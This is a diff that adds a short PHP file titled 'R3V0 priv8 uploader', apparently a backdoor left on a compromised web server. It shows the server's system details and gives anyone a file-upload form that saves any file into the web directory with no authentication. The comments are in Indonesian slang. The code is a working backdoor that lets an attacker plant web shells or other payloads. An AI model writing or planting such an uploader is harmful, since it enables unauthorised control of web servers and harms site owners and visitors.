@@ -1,0 +1,10 @@
+<?php
+echo '<h2>R3V0 priv8 uploader</h2>';
+echo '<b>'.php_uname().'</b>';
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader">';
+echo '<input type="file" name="file" size="50"><input name="R3V0" type="submit" value="Upload"></form>';
+if( $_POST['R3V0'] == "Upload" ) {
+	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Berhasil! </b>'; }
+	else { echo '<b>Gagal euy :(</b>'; }
+}
+?>
